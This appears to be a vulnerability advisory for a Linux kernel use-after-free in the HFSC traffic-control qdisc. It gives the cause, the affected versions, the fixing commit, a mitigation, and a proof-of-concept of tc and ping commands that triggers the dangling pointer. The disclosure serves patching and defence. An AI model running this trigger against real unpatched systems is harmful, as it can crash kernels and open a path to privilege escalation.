## Vulnerability Details

There is a use-after-free in the traffic control system's HFSC qdisc when a HFSC class with link-sharing has a parent without link-sharing. When a packet is enqueued at the the child class, `init_vf()` will call `vttree_insert()` on the parent. However, when the packet is dequeued, `vttree_remove()` will be skipped in `update_vf()` since the parent does not have the `HFSC_FSC` flag set. This leaves a dangling pointer which can be exploited to cause a use-after-free and achieve privilege escalation.

The vulnerability has been present since the HFSC qdisc was introduced in kernel version 2.6.3. It was fixed in version 6.5 with commit `b3d26c5702c7 ("net/sched: sch_hfsc: Ensure inner classes have fsc curve")`. This commit made it impossible for classes without link-sharing curves to become parents, since only inner classes with link-sharing curves are meaningful in the HFSC protocol.

Triggering the vulnerability requires `CONFIG_NET_SCH_HFSC` to be enabled in the kernel configuration. The user must have the `CAP_NET_ADMIN` capability to trigger the vulnerability, which can be gained with access to unprivileged user namespaces. Disabling unprivileged user namespaces prevents the vulnerability from being exploited for privilege escalation.

## POC
```
# Set lo up
ip link set lo up

# Create the HFSC qdisc and root class.
tc qdisc add dev lo parent root handle 1: hfsc def 2

# Add a real-time class as a child of root class.
tc class add dev lo parent 1: classid 1:1 hfsc rt umax 1 dmax 1 rate 1

# Add a link-sharing class as a child of the real-time class.
tc class add dev lo parent 1:1 classid 1:2 hfsc ls umax 1 dmax 1 rate 1

# Enqueue packet at link-sharing class, which calls init_vf() on it.
ping -c1 localhost

# Delete the parent and child classes, leaving a dangling pointer.
tc class del dev lo classid 1:2
tc class del dev lo classid 1:1

# Add a link-sharing class to enqueue packets to (if the queue is empty, hfsc_dequeue() will return before reaching the UaF)
tc class add dev lo parent 1: classid 1:2 hfsc ls umax 1 dmax 1 rate 1

# Trigger use after free in hfsc_dequeue()
ping -c1 localhost
```